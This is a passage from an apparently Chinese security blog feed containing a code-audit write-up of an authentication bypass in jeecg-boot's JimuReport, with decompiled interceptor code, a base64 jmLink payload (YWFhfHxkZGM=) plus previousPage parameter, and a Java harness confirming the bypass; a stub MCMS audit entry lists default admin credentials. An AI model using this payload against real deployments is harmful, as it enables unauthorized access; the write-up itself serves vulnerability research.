class="string">&quot;/jmreport/loadTableData&quot;</span>.equals(var4)) &#123;</span><br><span class="line">                                        var5 = GEN_TEST_DATA_CODE;</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="built_in">this</span>.backError(response, NO_PERMISSION_PROMPT_MSG, var5);</span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="type">boolean</span> <span class="variable">var13</span> <span class="operator">=</span> Arrays.stream(var12).anyMatch((code) -&gt; &#123;</span><br><span class="line">                                    <span class="keyword">return</span> j.a(code, var11);</span><br><span class="line">                                &#125;);</span><br><span class="line">                                <span class="keyword">if</span> (!var13) &#123;</span><br><span class="line">                                    log.error(<span class="string">&quot;此接口需要角色权限，请联系管理员！请求无权限(&quot;</span> + request.getMethod() + <span class="string">&quot;)：&quot;</span> + var4);</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="string">&quot;/jmreport/loadTableData&quot;</span>.equals(var4)) &#123;</span><br><span class="line">                                        var5 = GEN_TEST_DATA_CODE;</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="built_in">this</span>.backError(response, NO_PERMISSION_PROMPT_MSG, var5);</span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以从代码中看到在最下面是进行token校验的方法</p><p><img src="/jeecg-boot%E6%A1%86%E6%9E%B6RCE0day%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240812195111322.png" alt="image-20240812195111322"></p><p><img src="/jeecg-boot%E6%A1%86%E6%9E%B6RCE0day%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240812195149895.png" alt="image-20240812195149895"></p><p>如果可以在校验token前return true则会绕过token校验完成权限绕过</p><p>追踪代码定位到漏洞关键点：</p><p><img src="/jeecg-boot%E6%A1%86%E6%9E%B6RCE0day%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240812195402867.png" alt="image-20240812195402867"></p><p>首先需要携带previousPage参数，参数任意，之后追踪isShareingToken方法（省略部分方法）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isShareingToken</span><span class="params">(String requestPath, HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var3</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;JmReport-Share-Token&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (j.c(var3)) &#123;</span><br><span class="line">            var3 = request.getParameter(<span class="string">&quot;shareToken&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">var5</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;jmLink&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (j.d(var5)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">byte</span>[] var6 = Base64Utils.decodeFromString(var5);</span><br><span class="line">                <span class="type">String</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(var6);</span><br><span class="line">                String[] var8 = var7.split(<span class="string">&quot;\\|\\|&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (ArrayUtils.isNotEmpty(var8) &amp;&amp; var8.length == <span class="number">2</span>) &#123;</span><br><span class="line">                    var3 = var8[<span class="number">0</span>];</span><br><span class="line">                    var4 = var8[<span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">                a.error(<span class="string">&quot;解密失败：&quot;</span> + var9.getMessage());</span><br><span class="line">                a.error(var9.getMessage(), var9);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (j.c(var3)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">JimuReportShare</span> <span class="variable">var10</span> <span class="operator">=</span> <span class="built_in">this</span>.jimuReportShareDao.getShareByShareToken(var3);</span><br><span class="line">            <span class="keyword">if</span> (var10 != <span class="literal">null</span>) &#123;</span><br><span class="line">                var10 = <span class="built_in">this</span>.compareToDate(var10);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;0&quot;</span>.equals(var10.getStatus())) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">           </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>主要逻辑获取jmLink参数&#x3D;&gt;base64解码&#x3D;&gt;||分割 var3&#x3D;[0] &#x3D;&gt;判断c（var3）&#x3D;&gt;getShareByShareToken（var3）？失败：成功</p><p>#getShareByShareToken如果数据库查不到就成功返回true</p><p><img src="/jeecg-boot%E6%A1%86%E6%9E%B6RCE0day%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240812210136696.png" alt="image-20240812210136696"></p><p>根据这段代码的逻辑，写出简化逻辑绕过测试方法，YWFhfHxkZGM&#x3D;作为payload （base64：aaa||ddc）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jeecg.modules.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.ArrayUtils;</span><br><span class="line"><span class="keyword">import</span> org.jeecg.modules.jmreport.desreport.dao.JimuReportShareDao;</span><br><span class="line"><span class="keyword">import</span> org.jeecg.modules.jmreport.desreport.entity.JimuReportShare;</span><br><span class="line"><span class="keyword">import</span> org.jeecg.modules.jmreport.desreport.service.IJimuReportShareService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.EnableAutoConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ConfigurableApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.Base64Utils;</span><br><span class="line"><span class="keyword">import</span> org.jeecg.modules.jmreport.common.util.j;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication(scanBasePackages = &#123;&quot;org.jeecg&quot;, &quot;com.jeecg&quot;&#125;)</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration(exclude = &#123;MongoAutoConfiguration.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">d</span><span class="params">(String var0)</span> &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (var0.length() &lt; var1) &#123;</span><br><span class="line">            <span class="keyword">return</span> var0.toLowerCase();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(var0);</span><br><span class="line">            <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">2</span>; var4 &lt; var0.length(); ++var4) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Character.isUpperCase(var0.charAt(var4))) &#123;</span><br><span class="line">                    var2.insert(var4 + var3, <span class="string">&quot;_&quot;</span>);</span><br><span class="line">                    ++var3;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var2.toString().toLowerCase();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(test1.class, args);</span><br><span class="line"></span><br><span class="line">        <span class="type">IJimuReportShareService</span> <span class="variable">irss</span> <span class="operator">=</span> context.getBean(IJimuReportShareService.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">JimuReportShareDao</span> <span class="variable">jimuReportShareDao</span> <span class="operator">=</span> context.getBean(JimuReportShareDao.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="string">&quot;YWFhfHxkZGM=&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">d</span> <span class="operator">=</span> j.d(var5);</span><br><span class="line">        System.out.println(<span class="string">&quot;d:&quot;</span> + d);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (d)&#123;</span><br><span class="line">            <span class="type">byte</span>[] var6 = Base64Utils.decodeFromString((String)var5);</span><br><span class="line">            <span class="type">String</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(var6);</span><br><span class="line">            String[] var8 = var7.split(<span class="string">&quot;\\|\\|&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (ArrayUtils.isNotEmpty(var8) &amp;&amp; var8.length == <span class="number">2</span>) &#123;</span><br><span class="line">                var3 = var8[<span class="number">0</span>];</span><br><span class="line">                var4 = var8[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        System.out.println(var3);</span><br><span class="line">        System.out.println(var4);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">c</span> <span class="operator">=</span> j.c(var3);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;c:&quot;</span> + c);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;失败1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">JimuReportShare</span> <span class="variable">var10</span> <span class="operator">=</span> jimuReportShareDao.getShareByShareToken((String)var3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            System.out.println(var10);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var10 != <span class="literal">null</span>) &#123;</span><br><span class="line">                var10 = irss.compareToDate(var10);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;0&quot;</span>.equals(var10.getStatus())) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;失败2&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;成功1&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;成功2&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行显示结果，成功绕过</p><p><img src="/jeecg-boot%E6%A1%86%E6%9E%B6RCE0day%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240812205712312.png" alt="image-20240812205712312"></p>]]></content>
    
    
    <summary type="html">jeecg-boot框架RCE0day代码审计</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>MCMS系统代码审计</title>
    <link href="http://example.com/posts/3360380925.html"/>
    <id>http://example.com/posts/3360380925.html</id>
    <published>2024-07-25T03:18:17.000Z</published>
    <updated>2024-10-25T07:09:20.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MCMS系统的代码审计"><a href="#MCMS系统的代码审计" class="headerlink" title="MCMS系统的代码审计"></a>MCMS系统的代码审计</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://gitee.com/mingSoft/MCMS/repository/archive/5.2.6.zip">下载仓库 · 铭飞&#x2F;MCMS - Gitee.com</a></p><p>修改配置文件：端口8080&#x3D;&gt;8081 数据库配置</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>后台地址：</p><p><a href="http://192.168.1.8:8081/ms/login.do">http://192.168.1.8:8081/ms/login.do</a></p><p>msopen&#x2F;msopen</p><p><img src="/MCMS%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240728192731354.png" alt="image-20240728192731354"></p>]]></content>
    
    
    <summary type="html">MCMS系统代码审计</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
